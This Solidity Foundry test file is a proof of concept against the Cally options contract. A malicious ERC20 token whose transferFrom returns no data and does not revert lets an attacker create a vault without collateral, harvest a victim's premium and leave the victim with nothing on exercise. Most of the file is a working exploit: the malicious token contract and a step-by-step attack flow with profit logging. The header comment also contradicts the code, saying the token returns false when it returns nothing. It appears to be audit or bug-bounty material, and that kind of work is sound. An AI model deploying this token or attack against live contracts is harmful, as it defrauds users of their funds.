// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../shared/Fixture.t.sol";
import "src/Cally.sol";

/**
 * @title ExploitTest - PoC for ERC20 Token Transfer Vulnerability
 * @notice This test demonstrates how tokens that return false instead of reverting
 *         can be exploited to create vaults without providing collateral.
 *
 * VULNERABILITY:
 * Some ERC20 tokens (like ZRX) return false on failed transfers instead of reverting.
 * The createVault() function uses SafeTransferLib.safeTransferFrom() which may not
 * properly handle tokens that return false without reverting.
 *
 * ATTACK SCENARIO:
 * 1. Attacker creates a vault with a malicious ERC20 token that returns false on transfer
 * 2. The vault is created without any actual collateral being transferred
 * 3. A victim buys an option from this vault and pays the premium (attacker profits)
 * 4. When the victim exercises the option, they receive nothing (loss of funds)
 * 5. The attacker keeps the premium paid by the victim
 */
contract ExploitTest is Test, Fixture {
    MaliciousERC20 internal maliciousToken;
    address internal attacker;
    address internal victim;

    function setUp() public {
        // Setup attacker and victim addresses
        attacker = address(0xbad);
        victim = address(0x1234);

        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Deploy malicious token that returns false on transferFrom
        maliciousToken = new MaliciousERC20("Malicious Token", "MAL", 18);

        // Give victim some ETH to buy options
        vm.deal(victim, 100 ether);
    }

    /**
     * @notice Test demonstrating the vulnerability where a vault can be created
     *         without providing collateral using a token that returns false on transfer
     */
    function testExploitVaultCreationWithoutCollateral() public {
        uint256 vaultAmount = 1000 * 1e18; // 1000 tokens

        // STEP 1: Attacker creates a vault without providing any collateral
        // The malicious token will return false on transferFrom, but the vault is still created
        vm.startPrank(attacker);

        // Attacker doesn't need to mint or approve tokens - the transfer will just return false
        uint256 vaultId = c.createVault(
            vaultAmount,
            address(maliciousToken),
            2, // premiumIndex - 0.05 ether
            1, // durationDays
            0, // dutchAuctionStartingStrikeIndex - 1 ether
            0, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );

        vm.stopPrank();

        // VERIFY: Vault was created successfully
        Cally.Vault memory vault = c.vaults(vaultId);
        assertEq(vault.tokenIdOrAmount, vaultAmount, "Vault should be created with specified amount");
        assertEq(vault.token, address(maliciousToken), "Vault should reference malicious token");
        assertEq(c.ownerOf(vaultId), attacker, "Attacker should own the vault");

        // VERIFY: No tokens were actually transferred to the contract
        assertEq(maliciousToken.balanceOf(address(c)), 0, "Contract should have 0 tokens (no collateral)");
        assertEq(maliciousToken.balanceOf(attacker), 0, "Attacker should have 0 tokens");

        // STEP 2: Victim buys an option from the vault
        vm.startPrank(victim);

        uint256 premium = c.getPremium(vaultId);
        uint256 victimBalanceBefore = victim.balance;

        uint256 optionId = c.buyOption{value: premium}(vaultId);

        vm.stopPrank();

        // VERIFY: Victim paid the premium
        assertEq(victim.balance, victimBalanceBefore - premium, "Victim should have paid premium");
        assertEq(c.ownerOf(optionId), victim, "Victim should own the option");

        // VERIFY: Attacker can harvest the premium (profit from the exploit)
        vm.prank(attacker);
        uint256 attackerProfit = c.harvest();
        assertEq(attackerProfit, premium, "Attacker should receive the premium as profit");

        // STEP 3: Victim exercises the option
        vm.startPrank(victim);

        // Warp time to ensure option is still valid
        vm.warp(block.timestamp + 12 hours);

        Cally.Vault memory vaultBeforeExercise = c.vaults(vaultId);
        uint256 strikePrice = vaultBeforeExercise.currentStrike;

        uint256 victimTokenBalanceBefore = maliciousToken.balanceOf(victim);

        // Exercise the option by paying the strike price
        c.exercise{value: strikePrice}(optionId);

        vm.stopPrank();

        // VERIFY: Victim received NO tokens (the exploit's impact)
        uint256 victimTokenBalanceAfter = maliciousToken.balanceOf(victim);
        assertEq(
            victimTokenBalanceAfter,
            victimTokenBalanceBefore,
            "Victim should receive 0 tokens (no collateral was in vault)"
        );

        // VERIFY: Victim lost both premium and strike price
        // Premium was already paid and harvested by attacker
        // Strike price was paid but victim got nothing in return

        // SUMMARY OF EXPLOIT:
        // - Attacker created vault without providing collateral
        // - Victim paid premium (attacker's profit)
        // - Victim paid strike price but received no tokens
        // - Total victim loss: premium + strike price
        // - Attacker profit: premium (and potentially strike price if they can harvest it)

        console.log("=== EXPLOIT SUMMARY ===");
        console.log("Attacker profit from premium:", attackerProfit);
        console.log("Victim paid strike price:", strikePrice);
        console.log("Victim received tokens:", victimTokenBalanceAfter - victimTokenBalanceBefore);
        console.log("Vault collateral balance:", maliciousToken.balanceOf(address(c)));
    }
}

/**
 * @title MaliciousERC20
 * @notice A malicious ERC20 token that doesn't return any data on transferFrom
 * @dev This simulates tokens that have missing return values, which SafeTransferLib
 *      is supposed to handle gracefully. The vulnerability is that when a token
 *      doesn't return any data AND doesn't revert, SafeTransferLib treats it as success.
 */
contract MaliciousERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    /**
     * @notice Malicious transferFrom that doesn't return any data and doesn't revert
     * @dev This exploits SafeTransferLib's handling of tokens with missing return values.
     *      SafeTransferLib checks: "returned exactly 1 OR had no return data"
     *      By returning no data, we pass the check even though no transfer occurred.
     */
    function transferFrom(address, address, uint256) external pure {
        // Do nothing - no transfer, no revert, no return value
        // This passes SafeTransferLib's check: iszero(returndatasize()) == true
        // The assembly in SafeTransferLib will see returndatasize() == 0 and consider it success
    }

    /**
     * @notice Normal transfer function that also returns no data
     */
    function transfer(address, uint256) external pure {
        // Do nothing - no transfer, no revert, no return value
    }

    /**
     * @notice Normal approve function (not used in exploit but needed for ERC20 interface)
     */
    function approve(address, uint256) external pure returns (bool) {
        return true;
    }
}
